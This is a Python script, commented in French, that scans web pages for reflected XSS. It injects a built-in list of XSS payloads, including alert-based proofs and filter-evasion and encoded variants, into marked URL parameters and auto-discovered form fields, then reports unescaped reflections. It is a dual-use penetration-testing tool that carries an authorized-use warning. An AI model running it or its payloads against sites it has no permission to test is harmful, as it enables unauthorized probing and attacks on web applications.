#!/usr/bin/env python3
"""
=============================================================================
 xss_scanner.py — Détection de XSS réfléchi
=============================================================================
 Auteur   : [votre nom]
 Version  : 1.0
 OS       : Windows / macOS / Linux (Python 3.8+)
 Dépend.  : requests

 DESCRIPTION
 -----------
 Injecte des payloads XSS dans les paramètres d'URL et les champs de
 formulaires HTML, et vérifie si le payload est reflété non échappé
 dans la réponse (XSS réfléchi / stored potentiel).

 Marquer le paramètre à tester avec "TEST" dans l'URL.
 Avec --forms, découvre et teste automatiquement les formulaires de la page.

 USAGE
 -----
   python xss_scanner.py [options]

 EXEMPLES
 --------
   python xss_scanner.py --url "https://site.com/search?q=TEST"
   python xss_scanner.py --url "https://site.com/" --forms
   python xss_scanner.py --url "https://site.com/search?q=TEST" --deep
   python xss_scanner.py --url "https://site.com/" --forms -o xss.json

 OPTIONS
 -------
   --url        URL cible (utiliser TEST comme marqueur)
   --forms      Découvrir et tester les formulaires de la page
   --deep       Utiliser une liste étendue de payloads
   --timeout    Timeout en secondes (défaut: 10)
   --no-verify  Désactiver la vérification SSL
   --cookie     Cookie de session
   -o, --output Fichier JSON de sortie
   -v, --verbose Afficher chaque requête

 AVERTISSEMENT LÉGAL
 -------------------
 Utilisez uniquement sur des applications que vous êtes autorisé à tester.
=============================================================================
"""

import argparse
import html
import json
import re
import sys
import urllib.parse
from datetime import datetime
from html.parser import HTMLParser

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[ERREUR] Installez 'requests' : pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

def green(t):  return f"{Fore.GREEN}{t}{Style.RESET_ALL}" if COLOR else t
def yellow(t): return f"{Fore.YELLOW}{t}{Style.RESET_ALL}" if COLOR else t
def red(t):    return f"{Fore.RED}{t}{Style.RESET_ALL}" if COLOR else t
def cyan(t):   return f"{Fore.CYAN}{t}{Style.RESET_ALL}" if COLOR else t
def bold(t):   return f"{Style.BRIGHT}{t}{Style.RESET_ALL}" if COLOR else t
def dim(t):    return f"{Style.DIM}{t}{Style.RESET_ALL}" if COLOR else t

MARKER = "TEST"

# ─── Payloads XSS ─────────────────────────────────────────────────────────────

BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "<details open ontoggle=alert(1)>",
]

DEEP_PAYLOADS = BASE_PAYLOADS + [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<<script>alert(1)//<</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    '"><ScRiPt>alert(1)</ScRiPt>',
    "';alert(1)//",
    '";alert(1)//',
    "</script><script>alert(1)</script>",
    "<svg><script>alert(1)</script></svg>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<%2fscript><script>alert(1)<%2fscript>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<math><mtext></table></math><script>alert(1)</script>",
]

# ─── Parser de formulaires HTML ───────────────────────────────────────────────

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self._current = {
                "action": attrs.get("action", ""),
                "method": attrs.get("method", "get").upper(),
                "inputs": [],
            }
            self.forms.append(self._current)
        elif tag in ("input", "textarea", "select") and self._current is not None:
            self._current["inputs"].append({
                "name":  attrs.get("name", ""),
                "type":  attrs.get("type", "text"),
                "value": attrs.get("value", ""),
            })

    def handle_endtag(self, tag):
        if tag == "form":
            self._current = None


def parse_forms(html_text: str, base_url: str) -> list[dict]:
    parser = FormParser()
    parser.feed(html_text)
    forms = []
    base_parts = urllib.parse.urlparse(base_url)
    for f in parser.forms:
        action = f["action"] or base_url
        if action.startswith("/"):
            action = f"{base_parts.scheme}://{base_parts.netloc}{action}"
        elif not action.startswith("http"):
            action = base_url.rstrip("/") + "/" + action
        forms.append({
            "action": action,
            "method": f["method"],
            "inputs": [i for i in f["inputs"] if i["name"] and i["type"] != "hidden"],
        })
    return forms

# ─── Détection de réflexion ───────────────────────────────────────────────────

def is_reflected(payload: str, response_text: str) -> bool:
    """Vérifie si le payload brut (non échappé) est présent dans la réponse."""
    # Chercher le payload brut OU la version non-échappée des entités
    return payload in response_text or html.unescape(payload) in response_text


def test_url_params(session, url: str, payloads: list, timeout: int,
                    verify: bool, cookies: dict, verbose: bool) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    for param, values in params.items():
        if MARKER not in (values[0] if values else ""):
            continue
        print(f"  {bold('Paramètre URL:')} {param}")
        for payload in payloads:
            test_params = dict(params)
            test_params[param] = [payload]
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            try:
                resp = session.get(test_url, timeout=timeout, verify=verify, cookies=cookies)
                if is_reflected(payload, resp.text):
                    print(f"  {red('[VULN]')} {param}={dim(payload[:50])}")
                    findings.append({
                        "type":      "reflected-xss",
                        "location":  "url-param",
                        "parameter": param,
                        "payload":   payload,
                        "url":       test_url,
                    })
                elif verbose:
                    print(f"  {dim('[ok]')} {dim(payload[:40])}")
            except Exception:
                continue
    return findings


def test_forms(session, forms: list, payloads: list, timeout: int,
               verify: bool, cookies: dict, verbose: bool) -> list[dict]:
    findings = []
    for form in forms:
        print(f"  {bold('Formulaire:')} {form['action']} [{form['method']}]")
        for inp in form["inputs"]:
            if not inp["name"]:
                continue
            for payload in payloads:
                data = {i["name"]: (payload if i["name"] == inp["name"] else i["value"])
                        for i in form["inputs"]}
                try:
                    if form["method"] == "POST":
                        resp = session.post(form["action"], data=data,
                                            timeout=timeout, verify=verify, cookies=cookies)
                    else:
                        resp = session.get(form["action"], params=data,
                                           timeout=timeout, verify=verify, cookies=cookies)
                    if is_reflected(payload, resp.text):
                        print(f"  {red('[VULN]')} form input={inp['name']}  payload={dim(payload[:50])}")
                        findings.append({
                            "type":      "reflected-xss",
                            "location":  "form",
                            "action":    form["action"],
                            "method":    form["method"],
                            "parameter": inp["name"],
                            "payload":   payload,
                        })
                    elif verbose:
                        print(f"  {dim('[ok]')} {inp['name']}={dim(payload[:30])}")
                except Exception:
                    continue
    return findings

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Détection de XSS réfléchi dans les paramètres URL et formulaires",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url",      required=True)
    parser.add_argument("--forms",    action="store_true",
                        help="Tester les formulaires de la page")
    parser.add_argument("--deep",     action="store_true",
                        help="Utiliser la liste étendue de payloads")
    parser.add_argument("--timeout",  type=int, default=10)
    parser.add_argument("--no-verify",action="store_true")
    parser.add_argument("--cookie",   default="")
    parser.add_argument("-o", "--output")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    payloads = DEEP_PAYLOADS if args.deep else BASE_PAYLOADS
    cookies  = dict(c.split("=", 1) for c in args.cookie.split(";") if "=" in c) if args.cookie else {}
    verify   = not args.no_verify

    print(cyan("=" * 65))
    print(cyan("  XSS Scanner"))
    print(cyan(f"  URL      : {args.url[:60]}"))
    print(cyan(f"  Payloads : {len(payloads)}  |  Forms : {args.forms}"))
    print(cyan("=" * 65 + "\n"))

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (XSS-Audit; authorized-pentest)"
    all_findings = []

    # Récupérer la page de base
    try:
        base_resp = session.get(args.url.replace(MARKER, "test"),
                                timeout=args.timeout, verify=verify, cookies=cookies)
    except Exception as e:
        print(red(f"[ERREUR] {e}"))
        sys.exit(1)

    # Test paramètres URL
    if MARKER in args.url:
        print(bold("[ Paramètres URL ]\n"))
        all_findings += test_url_params(session, args.url, payloads,
                                        args.timeout, verify, cookies, args.verbose)

    # Test formulaires
    if args.forms:
        forms = parse_forms(base_resp.text, args.url.replace(MARKER, ""))
        if forms:
            print(bold(f"\n[ Formulaires trouvés : {len(forms)} ]\n"))
            all_findings += test_forms(session, forms, payloads,
                                       args.timeout, verify, cookies, args.verbose)
        else:
            print(yellow("  Aucun formulaire trouvé sur cette page."))

    print(f"\n{cyan('─'*65)}")
    if all_findings:
        print(red(f"  [!] {len(all_findings)} vecteur(s) XSS détecté(s) !"))
    else:
        print(green("  Aucun XSS réfléchi détecté."))
    print(cyan("─" * 65))

    if args.output:
        out = {
            "timestamp": datetime.now().isoformat(),
            "url":       args.url,
            "vulnerable": bool(all_findings),
            "findings":  all_findings,
        }
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2, ensure_ascii=False)
        print(green(f"\n[+] Rapport : {args.output}"))


if __name__ == "__main__":
    main()
